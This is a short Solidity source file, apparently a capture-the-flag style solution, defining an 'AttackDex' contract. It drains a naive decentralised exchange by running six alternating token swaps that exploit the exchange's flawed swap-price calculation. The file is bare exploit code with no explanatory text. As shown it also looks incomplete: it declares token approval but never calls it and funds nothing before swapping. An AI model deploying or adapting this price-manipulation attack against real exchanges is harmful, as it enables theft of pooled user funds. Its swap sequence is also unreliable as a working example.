// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface Dex {
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract AttackDex {
    Dex public dex;
    address public token1;
    address public token2;

    constructor(address _dex) {
        dex = Dex(_dex);
        token1 = 0x007Ac777eABBefC9806C6cE859DEA6C5837E32ed;
        token2 = 0xfC2F0A3fCf8C303Ca895f46D337299D09f2Fc01B;
    }

    function executeAttack() external {

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);
    }
}
